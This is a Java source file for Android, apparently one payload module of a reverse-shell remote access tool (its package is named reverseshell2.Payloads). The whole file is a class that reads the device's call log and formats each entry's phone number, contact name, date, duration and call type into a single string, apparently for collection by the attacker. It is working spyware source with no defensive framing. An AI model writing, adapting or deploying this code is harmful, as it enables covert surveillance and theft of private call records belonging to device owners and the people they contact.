package com.example.reverseshell2.Payloads;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import java.util.Date;

public class readCallLogs {

    Context context;
    Activity activity;

    String call_logs;

    public readCallLogs(Context context,Activity activity) {
        this.context = context;
        this.activity = activity;
    }


    public String readLogs(){
        Uri allCalls = Uri.parse("content://call_log/calls");
        Cursor c = activity.managedQuery(allCalls, null, null, null, null);

        try{
            if (c.moveToFirst()) {
                for (int i = 0; i < c.getCount(); ++i) {
                    String iterator = String.valueOf(i);
                    String num= c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String name= c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    String duration = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    int type = Integer.parseInt(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    String callDate = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    Date callDayTime = new Date(Long.valueOf(callDate));
                    String fi = "#"+iterator+"\n"+"Number : "+num+"\n"+"Name : "+name+"\n"+"Date : "+callDayTime+"\n"+"Duration : "+duration+"\n"
                            +"Type : "+type+"\n";

                    call_logs+=fi+"\n";
                    c.moveToNext();
                }
                call_logs += "\n";
            }
        }catch (NullPointerException e){
            call_logs=" ";
        }
            return call_logs;
    }

}
